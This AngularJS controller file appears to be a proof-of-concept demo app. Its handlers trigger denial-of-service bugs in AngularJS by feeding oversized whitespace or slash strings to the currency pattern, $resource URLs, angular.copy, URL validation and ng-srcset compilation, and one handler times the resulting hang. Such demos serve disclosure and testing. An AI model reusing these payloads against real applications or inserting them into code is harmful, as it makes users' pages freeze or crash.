// Create the module where our functionality can attach to
let appModule = angular.module('app', []);



// Controllers
appModule.component('appComponent', {
  templateUrl: 'app/app.template.html',
  controller: controller,
});

controller.$inject = ['$locale', '$timeout', '$resource', '$timeout', '$scope', '$compile']
function controller($locale, $timeout, $resource, $timeout, $scope, $compile) {
  'ngInject';
  const ctrl = this;
  ctrl.currencySymbol = '$';
  ctrl.amount = 100;
  ctrl.posPre = $locale.NUMBER_FORMATS.PATTERNS[1].posPre;
  ctrl.ngSrcSetDdos = 'https://placehold.co/600x400,'


  ctrl.onPosPreChange = () => {
    $locale.NUMBER_FORMATS.PATTERNS[1].posPre = ctrl.posPre;
    const amount = ctrl.amount;
    ctrl.amount = 0;
    $timeout(() => (ctrl.amount = amount));
  };

  ctrl.onReDos = () => {
    ctrl.currencySymbol = '';
    ctrl.posPre = ' '.repeat(1000000);
    $locale.NUMBER_FORMATS.PATTERNS[1].posPre = ctrl.posPre;
  };

  ctrl.query = () => {
    let resourceExpoit = $resource(`https://example.com/something/foo${'/'.repeat(100000)}bar`, {}, {}, { cancellable: true, });
    resourceExpoit.query()
  }

  ctrl.angularCopy = () => {
    let a = new RegExp('x'.repeat(1000000))
    angular.copy(a)
  }

  ctrl.validator = () => {
    ctrl.url = `scheme:${'/'.repeat(1000000)}`;
    ctrl.urlInputController = ctrl.urlInput.controller('ngModel');
    let urlInputValidators = ctrl.urlInputController.$validators;
    ctrl.urlInputController.$validators = {};

    $timeout(() => {
      ctrl.urlInputController.$validators = urlInputValidators;
      ctrl.urlInputController.$validate();
    }, 1000)
  }

  ctrl.ngSrcSetDdosNow = () => {
    try {
        ctrl.ngSrcSetDdos = `https://placehold.co/600x400 2x, ${' '.repeat(2 ** 20)}http://example.com/image.png`
        ctrl.ngSrcSetCompiledElem.html(`<img ng-srcset="${ctrl.ngSrcSetDdos}">`);

        const scope = ctrl.ngSrcSetCompiledElem.scope();
        const start = performance.now();
        $compile(ctrl.ngSrcSetCompiledElem)(scope);
        $scope.$root.$applyAsync();
        const end = performance.now();

        //const start = performance.now();
        //$compile(ctrl.ngSrcSetCompiledElem)($scope);
        //$scope.$applyAsync();
        //const end = performance.now();

        ctrl.duration = `${((end - start) / 1000).toFixed(2)} seconds`;
      } catch (err) {
        console.error(err);

        ctrl.duration = '(APP CRASHED)';
      } finally {
        $scope.$applyAsync()
      }
  }

}
